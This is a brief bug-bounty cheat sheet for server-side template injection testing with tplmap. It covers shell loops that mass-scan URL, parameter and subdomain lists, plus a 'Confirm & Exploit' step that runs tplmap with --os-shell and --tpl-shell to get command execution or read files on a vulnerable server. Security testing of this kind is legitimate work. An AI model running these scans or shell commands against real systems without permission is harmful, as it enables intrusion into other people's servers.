Server-Side Template Injection (SSTI)

SSTI testing methodology using tplmap for template injection detection.

Tool: tplmap

Requirements

  • subdomain.txt
  • urls.txt (accurate)
  • parameter.txt

Install (if not installed)

git clone https://github.com/epinna/tplmap.git
cd tplmap
pip3 install -r requirements.txt

SSTI Testing Workflow

1. Basic SSTI Scan on urls.txt

Tests URLs as-is (already containing parameters):

while read url; do
  python3 tplmap.py -u "$url" --level 1 --technique SSTI
done < urls.txt

2. SSTI Scan using parameter.txt

Inject SSTI payloads into each parameter name:

while read url; do
  while read param; do
    python3 tplmap.py -u "$url" -d "$param=1" --level 2 --technique SSTI
  done < parameter.txt
done < urls.txt

3. Subdomain-wide SSTI Discovery

Use subdomains to find template-based endpoints:

while read sub; do
  python3 tplmap.py -u "https://$sub" --level 1 --technique SSTI
done < subdomain.txt

4. Aggressive SSTI Detection (Recommended)

Higher payload coverage + deeper detection:

while read url; do
  python3 tplmap.py -u "$url" --level 3 --engine auto
done < urls.txt

5. Confirm & Exploit (Only if SSTI Found)

Try command execution:

python3 tplmap.py -u "VULNERABLE_URL" --os-shell

Or file read:

python3 tplmap.py -u "VULNERABLE_URL" --tpl-shell

Pro Tips (Bug Bounty)

Focus on params like:

  • redirect
  • return
  • view
  • page
  • template
  • name
  • email

SSTI often appears on:

  • Error pages
  • Email preview
  • PDF/Report generators
  • Admin panels
